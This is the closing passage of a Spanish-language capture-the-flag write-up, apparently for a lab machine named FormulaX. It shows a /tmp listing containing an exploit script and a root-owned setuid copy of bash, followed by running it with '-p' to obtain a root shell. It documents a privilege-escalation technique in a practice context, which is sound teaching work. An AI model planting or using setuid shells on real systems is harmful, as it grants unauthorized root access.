</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1440
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 14 root      root        12288 May 22 04:43 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 19 root      root         4096 Feb 20 16:16 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .ICE-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .Test-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .X11-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .XIM-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>srwxr-xr-x  1 root      root            0 May 22 04:38 OSL_PIPE_0_SingleOfficeIPC_53bc4297d6d012e1a744f3977d159334
</span></span></span><span class=line><span class=cl><span class=go>-rwxrwxr-x  1 kai_relay kai_relay      68 May 22 04:42 exploit.sh
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root      root      1396520 May 22 04:43 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 root      root         4096 May 22 04:38 hsperfdata_root
</span></span></span><span class=line><span class=cl><span class=go>drwx------  2 root      root         4096 May 22 04:38 lu23658821vhl2.tmp
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Nos podemos convertir en <code>root</code> finalmente corriendo este archivo junto con la flag <code>-p</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.1# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root   
</span></span></span></code></pre></div><p>Game Over. Podemos leer la flag del usuario <code>root</code> en el directorio <code>/root</code>.</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>